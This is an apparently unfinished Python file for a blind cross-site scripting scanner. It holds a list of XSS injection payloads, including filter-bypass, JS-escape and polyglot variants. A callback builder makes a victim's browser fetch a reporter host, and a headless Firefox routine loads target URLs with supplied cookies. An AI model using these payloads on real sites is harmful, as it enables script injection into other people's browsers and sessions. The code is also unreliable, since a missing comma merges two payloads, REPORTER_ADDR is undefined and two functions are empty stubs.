import logging
import asyncio
from arsenic import get_session, services, browsers

XSS_PAYLOADS = [
    # Basic payloads
    "<script>%s</script>",
    '>"<script>%s</script>',
    "<img src=a onerror=%s>",
    '>"<img src=a onerror=%s>',
    "<svg/onload=%s>",
    "javascript:%s",
    # .lower() sanitation check
    "<scrİpt>%s</scrİpt>"
    # Recursive filter checks
    "<scri<script>pt>%s</scr</script>ipt>",
    "<scri<script>pt>%s</script>",
    # Template injection
    '{{ "<script>%s</script>" }}',
    # JS Escape payloads
    '";%s;//',
    "';%s;//",
    "');%s;//",
    '")%s;//',
    "')%s;//",
    "}]};%s//\\",
    "\\x3cscript\\x3e%s\\x3c\\x2fscript\\x3e",
    # Polyglot
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+%s//'>",
]


def build_callback(callback_id):
    payload = 'fetch("%s/callback?log=%d")' % (REPORTER_ADDR, callback_id)
    return payload


async def visit(config):
    service = services.Geckodriver()
    browser = browsers.Firefox(**{"moz:firefoxOptions": {"args": ["-headless"]}})

    async with get_session(service, browser) as session:
        await session.delete_all_cookies()
        for c in config.get("cookies", {}):
            await session.add_cookie(c, config["cookies"][c])

        await session.get(config["url"])


async def inquisit(url):
    pass


async def inquisition(url):
    pass
